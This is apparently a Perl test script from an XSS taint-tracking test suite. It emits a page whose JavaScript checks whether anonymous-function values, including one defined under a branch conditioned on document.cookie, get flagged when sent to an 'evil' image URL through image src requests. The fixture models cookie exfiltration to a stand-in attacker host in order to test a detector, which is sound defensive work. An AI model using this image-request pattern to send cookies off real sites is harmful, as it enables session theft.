#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_ANONFUNOBJ";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		
		// shouldn't be evil
		
		var notevil = function (b) {
		}
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;		
    
		// if with evil val
		
		if ($evil) {
			var notevil2 = function (b) {
			}
		}
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage
		
		var notevil3 = 1;
		notevil3 = function (b) {
		}
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";